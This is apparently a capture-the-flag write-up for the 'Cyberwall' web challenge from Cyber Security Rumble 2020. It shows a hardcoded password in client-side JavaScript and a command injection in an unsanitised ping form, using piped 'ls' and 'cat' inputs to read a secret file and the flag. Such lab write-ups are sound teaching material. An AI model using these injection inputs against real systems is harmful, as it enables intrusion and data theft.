---
layout: post
title: "Cyberwall - Cyber Security Rumble CTF 2020"
author: gameplayone23
tags:
- WEB
- 2020
---

# Cyberwall

- Category: Web

*"We had problems with hackers, but now we got a enterprise firewall system build by a leading security company."*

- There is a website that goes to http://chal.cybersecurityrumble.de:3812/

# Get in

The `password` is located in the index.html

```html
<script type="text/javascript">
    function checkPw() {
        var pass = document.getElementsByName('passwd')[0].value;
        if (pass != "rootpw1337") {
        alert("This Password is invalid!");
        return false;
        }
        window.location.replace("management.html");
    }
</script>
```

# Ping a host

The website provides a feature to ping a host but the form is not sanitized.

After the host we can add shell command :

```bash
ping localhost | ls
```

displays :

```
requirements.txt
static
super_secret_data.txt
templates
webapp.py
wsgi.py
```

Then 

```bash
ping localhost | cat super_secret_data.txt
```
displays the flag :

```
CSR{oh_damnit_should_have_banned_curl_https://news.ycombinator.com/item?id=19507225}
```
